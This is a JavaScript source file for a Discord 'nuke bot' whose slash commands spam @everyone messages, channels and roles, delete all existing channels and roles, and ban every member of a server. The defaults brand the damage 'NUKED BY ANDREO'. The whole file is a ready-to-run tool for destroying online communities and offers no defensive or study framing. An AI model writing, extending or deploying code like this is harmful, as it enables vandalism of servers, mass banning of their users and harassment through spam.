const { 
  Client, 
  GatewayIntentBits, 
  PermissionsBitField, 
  SlashCommandBuilder, 
  REST, 
  Routes 
} = require('discord.js');
const express = require('express');

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const PORT = process.env.PORT || 8080;

// ---------- keep-alive ----------
const app = express();
app.get('/', (_req, res) => res.send('nuke bot alive'));
app.listen(PORT, () => console.log(`keep-alive on :${PORT}`));

// ---------- client ----------
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
  ]
});

// ---------- utils ----------
const delay = (ms) => new Promise(r => setTimeout(r, ms));

// ---------- actions ----------
async function spamChannels(guild, name, count, speed) {
  for (let i = 0; i < count; i++) {
    await guild.channels.create({ name }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function spamRoles(guild, name, count, speed) {
  for (let i = 0; i < count; i++) {
    await guild.roles.create({ name: `${name}-${i}` }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function wipeChannels(guild, speed) {
  for (const [, ch] of guild.channels.cache) {
    await ch.delete().catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function wipeRoles(guild, speed) {
  for (const [, role] of guild.roles.cache) {
    if (role.id === guild.id || role.managed) continue;
    await role.delete().catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function banAll(guild, speed) {
  const members = await guild.members.fetch();
  for (const [, m] of members) {
    if (m.id === client.user.id) continue;
    if (!m.bannable) continue;
    await guild.members.ban(m.id, { reason: 'nuked' }).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function renameAllChannels(guild, newName, speed) {
  for (const [, ch] of guild.channels.cache) {
    await ch.setName(newName).catch(() => {});
    if (speed > 0) await delay(speed);
  }
}

async function spamMessages(guild, message, count, speed) {
  for (const [, ch] of guild.channels.cache) {
    if (!ch.isTextBased()) continue;
    for (let i = 0; i < count; i++) {
      await ch.send(message).catch(() => {});
      if (speed > 0) await delay(speed);
    }
  }
}

// ---------- slash commands ----------
const commands = [
  new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Full server nuke with custom options')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator)
    .addStringOption(o =>
      o.setName('channel_name').setDescription('Name for the new channels').setRequired(false))
    .addStringOption(o =>
      o.setName('role_name').setDescription('Name for the new roles').setRequired(false))
    .addStringOption(o =>
      o.setName('message').setDescription('Message to spam in channels').setRequired(false))
    .addIntegerOption(o =>
      o.setName('channel_count').setDescription('How many channels to create (default 30)').setMinValue(1).setMaxValue(100).setRequired(false))
    .addIntegerOption(o =>
      o.setName('role_count').setDescription('How many roles to create (default 30)').setMinValue(1).setMaxValue(100).setRequired(false))
    .addIntegerOption(o =>
      o.setName('message_count').setDescription('Spam messages per channel (default 10)').setMinValue(1).setMaxValue(50).setRequired(false))
    .addIntegerOption(o =>
      o.setName('speed').setDescription('Delay in ms between actions (default 0)').setMinValue(0).setMaxValue(5000).setRequired(false))
    .addBooleanOption(o =>
      o.setName('ban_all').setDescription('Ban every member? (default yes)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('wipe_channels').setDescription('Delete existing channels? (default yes)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('wipe_roles').setDescription('Delete existing roles? (default yes)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('rename_channels').setDescription('Rename existing channels before wiping? (default no)').setRequired(false))
    .addBooleanOption(o =>
      o.setName('spam_messages').setDescription('Spam messages before wiping? (default yes)').setRequired(false)),

  new SlashCommandBuilder().setName('wipe').setDescription('Delete channels and roles only')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder().setName('banall').setDescription('Ban everyone')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
  new SlashCommandBuilder().setName('stop').setDescription('Stop the bot')
    .setDefaultMemberPermissions(PermissionsBitField.Flags.Administrator),
].map(c => c.toJSON());

// ---------- events ----------
client.once('ready', async () => {
  console.log(`logged in as ${client.user.tag} | ${client.guilds.cache.size} guilds`);
  const rest = new REST({ version: '10' }).setToken(TOKEN);
  
  try {
    console.log('Clearing old global commands...');
    // مسح الأوامر القديمة مثل /gg
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: [] });
    
    console.log('Registering new commands...');
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('Slash commands registered successfully.');
  } catch (err) {
    console.error('Register failed:', err);
  }
});

client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, guild } = interaction;
  if (!guild) return;

  if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
    return interaction.reply({ content: 'You need Administrator permission.', ephemeral: true });
  }

  // ============ /nuke ============
  if (commandName === 'nuke') {
    await interaction.deferReply({ ephemeral: true });

    const chName    = interaction.options.getString('channel_name')   || 'nuked-by-andreo';
    const roleName  = interaction.options.getString('role_name')      || 'nuked';
    const msgText   = interaction.options.getString('message')        || '@everyone NUKED BY ANDREO';
    const chCount   = interaction.options.getInteger('channel_count') ?? 30;
    const roleCount = interaction.options.getInteger('role_count')    ?? 30;
    const msgCount  = interaction.options.getInteger('message_count') ?? 10;
    const speed     = interaction.options.getInteger('speed')         ?? 0;
    const doBan     = interaction.options.getBoolean('ban_all')       ?? true;
    const doWipeCh  = interaction.options.getBoolean('wipe_channels') ?? true;
    const doWipeRl  = interaction.options.getBoolean('wipe_roles')    ?? true;
    const doRename  = interaction.options.getBoolean('rename_channels') ?? false;
    const doSpamMsg = interaction.options.getBoolean('spam_messages') ?? true;

    await interaction.editReply({ content: 'Execution started...' });

    try {
      if (doSpamMsg) await spamMessages(guild, msgText, msgCount, speed);
      if (doRename)  await renameAllChannels(guild, chName, speed);
      await spamChannels(guild, chName, chCount, speed);
      await spamRoles(guild, roleName, roleCount, speed);
      if (doWipeCh) await wipeChannels(guild, speed);
      if (doWipeRl) await wipeRoles(guild, speed);
      if (doBan)    await banAll(guild, speed);

      await interaction.editReply({ content: 'Nuke complete ✅' }).catch(() => {});
    } catch (err) {
      await interaction.editReply({ content: `Error: ${err.message}` }).catch(() => {});
    }
    return;
  }

  // ============ Simple commands ============
  if (commandName === 'wipe') {
    await interaction.reply({ content: 'Wiping started...', ephemeral: true });
    await wipeChannels(guild, 0);
    await wipeRoles(guild, 0);
    return;
  }

  if (commandName === 'banall') {
    await interaction.reply({ content: 'Banning started...', ephemeral: true });
    await banAll(guild, 0);
    return;
  }

  if (commandName === 'stop') {
    await interaction.reply({ content: 'Shutting down...', ephemeral: true });
    process.exit(0);
  }
});

client.login(TOKEN);